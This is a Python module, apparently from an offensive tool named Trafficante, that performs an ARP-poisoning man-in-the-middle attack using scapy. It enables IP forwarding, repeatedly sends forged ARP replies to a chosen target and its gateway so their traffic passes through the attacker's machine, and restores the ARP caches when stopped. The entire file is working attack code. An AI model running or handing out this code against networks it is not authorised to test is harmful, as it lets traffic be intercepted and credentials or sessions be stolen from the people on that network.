# github.com/n0nexist/Trafficante

from scapy.all import Ether, ARP, srp, send
from threading import Thread as th
import modules.utils as utils
import time
import os
import signal
import sys

def enable_ip_route():
    """ enables ip forwarding """
    
    print(f"{utils.colors.GREEN}*{utils.colors.ITALIC} enabling ip forwarding{utils.colors.RESET}")    
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() != 1:
            with open(file_path, "w") as f:
                print(1, file=f)
    print(f"{utils.colors.BLUE}!{utils.colors.ITALIC} done{utils.colors.RESET}")   
    
def disable_ip_route():
    """ disables ip forwarding """
    
    print(f"{utils.colors.GREEN}*{utils.colors.ITALIC} disabling ip forwarding{utils.colors.RESET}")    
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() != 0:
            with open(file_path, "w") as f:
                print(0, file=f)
    print(f"{utils.colors.BLUE}!{utils.colors.ITALIC} done{utils.colors.RESET}")     
    
def get_mac(ip):
    """ gets the mac address of an ip """
    
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    
def spoof(target_ip, host_ip, verbose=True):
    """ starts poisoning the arp cache """

    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)


def restore(target_ip, host_ip, verbose=True):
    """ restores the arp cache """

    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=7)
    
def mitm_thread(target,gw):
    """ the mitm attack function """ 
       
    while True:
        try:
            spoof(target, gw)
            spoof(gw, target)
            time.sleep(1)
        except Exception as e:
            print(f"{utils.colors.FAIL}!{utils.colors.ITALIC} {e}{utils.colors.RESET}")
            pass
    
def start_mitm(target,gw):
    """ starts the mitm attack """
    
    print(f"{utils.colors.GREEN}*{utils.colors.ITALIC} launching man-in-the-middle attack against {target} as {gw}{utils.colors.RESET}")
    print(f"{utils.colors.GREEN}*{utils.colors.ITALIC} press enter to stop the attack{utils.colors.RESET}")    
    enable_ip_route()
    th(target=mitm_thread,args=(target, gw,)).start()
    input()
    print(f"{utils.colors.BLUE}!{utils.colors.ITALIC} stopping the man-in-the-middle attack{utils.colors.RESET}")
    restore(gw,target)
    restore(target, gw)
    disable_ip_route()
    print(f"{utils.colors.BLUE}!{utils.colors.ITALIC} killing this process..{utils.colors.RESET}",end="")
    os.kill(os.getpid(), signal.SIGKILL)